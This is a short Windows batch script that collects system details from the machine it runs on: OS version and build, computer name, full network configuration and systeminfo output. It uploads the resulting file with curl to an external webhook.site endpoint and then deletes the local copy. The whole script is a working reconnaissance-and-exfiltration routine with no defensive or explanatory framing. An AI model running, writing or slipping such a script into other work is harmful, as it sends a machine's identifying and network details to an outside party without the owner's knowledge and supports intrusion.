@echo off
echo OS information: > info.txt
wmic OS get Caption,OSArchitecture,BuildNumber>temp-info.txt
type temp-info.txt >> info.txt
del temp-info.txt
echo.  >> info.txt
echo Computer name: >> info.txt
set COMPUTERNAME >> info.txt
echo. >> info.txt
echo Network information: >> info.txt
ipconfig /all >> info.txt
echo. >> info.txt
echo System information: >> info.txt
systeminfo.exe >> info.txt
curl https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513 -F SystemInfo=@info.txt
del info.txt